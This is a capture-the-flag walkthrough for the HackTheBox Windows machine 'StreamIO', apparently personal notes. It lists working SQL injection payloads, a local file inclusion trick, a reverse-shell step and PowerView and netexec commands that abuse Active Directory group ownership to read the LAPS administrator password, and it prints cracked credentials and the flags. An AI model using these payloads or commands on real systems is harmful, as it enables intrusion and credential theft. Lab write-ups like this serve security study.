```json
Alias: StreamIO
Date: 18-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.237.153
```

# StreamIO
# Summary

- StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use `WinPEAS` to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the `Core Staff` group, then access LDAP to disclose the administrator LAPS password.

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-18 13:09 PKT
Nmap scan report for 10.129.237.153
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-18 15:09:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2024-08-18T15:10:30+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-08-18T15:09:53
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.52 seconds
```
## Discovered Subdomains
```
http://streamio.htb
https://streamio.htb
https://watch.streamio.htb
```

---
# Enumeration

There is a lot to enumerate but the vulnerable part is:

https://watch.streamio.htb/search.php

Try this payload to list the mssql version:
`500'+union+select+1,(SELECT+@@VERSION,3,4,5,6;--`

And we can do this to get username and password hashes for staff

`500' union select 1,concat(username,':',password),3,4,5,6 FROM users WHERE is_staff = 1;--`

With this we get a bunch of users and their md5, Some of them crack some don't.

There is one user in particular that can login to the admin panel on streamio.htb

| Username  | Password         |
| --------- | ---------------- |
| yoshihide | 66boysandgirls.. |

http://streamio.htb/admin/?PARAM=

Fuzz the PARAM with ffuf using seclists' burp-parameter-list.txt and we will find the debug parameter.

---

# Exploitation

With the debug parameter we can include local files.
`php://filter/read=convert.base64-encode/resource=master.php`
Use this to get master.php, and notice at the end of the file a hidden input that can be used to get contents of a remote file and eval them.

I used [this](https://github.com/ivan-sincek/php-reverse-shell) to get a reverse shell. Make sure to remove the `<?php` and `?>` from the reverse shell code.

Set up a listener and we get shell as `streamio\\yoshihide`. 

---

# Lateral Movement

## nikk37
When we were enumerating the database from search.php, we didn't have permissions to list the contents of the streamio_backup database, but we can try again now that we have the admin credentials from index.php.

The users tables contains a bunch of hashes but only nikk37's hash is cracked.

| Username | Password                 |
| -------- | ------------------------ |
| nikk37   | get_dem_girls2@yahoo.com |
And we finally have a domain user.

## JDGODD
`C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release`
Has encrypted firefox passwords, we ca use [this](https://github.com/unode/firefox_decrypt) to decrypt and get the password for JDGODD who is an administrator

| Username | Password             |
| -------- | -------------------- |
| jdgodd   | JDg0dd1s@d0p3cr3@t0r |

---

# Privilege Escalation

![[Pasted image 20240819130907.png]]

We are going to abuse this path to the admin. `JDGODD` can write the owner of `CORE STAFF` Which can read LAPS Password on the DC.

First import powerview to change owner of `Core Staff`.

Create PSCredential for `jdgodd`
```powershell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio\jdgodd', $SecPassword)
```

Set `jdgodd` as the owner of `CORE STAFF`

```powershell
Set-DomainObjectOwner -Credential $Cred -Identity "CORE STAFF" -OwnerIdentity jdgodd -Verbose
```

Give `nikk37` `GenericAll` over the group
```powershell
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity "nikk37" -Rights All -Credential $Cred -Verbose
```

Add `nikk37` to the group.
```powershell
Add-DomainGroupMember -Identity "CORE STAFF" -Members "nikk37" -Verbose
```

Read laps password with netexec

```bash
nxc winrm $IP --dns-server $IP -d streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' --laps
```

| Username      | Password       |
| ------------- | -------------- |
| administrator | 0D+6m0#s5TGR6& |

---

# Flags
- 026658030998433ead4de7eb27dbffdd
- d9b5fd4d54573d00d15e0d7fcda66c99

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #Windows #SQLi/MSSQL #ActiveDirectory #LFI #ActiveDirectory/LAPS #Pillaging #Firefox #Firefox/decrypt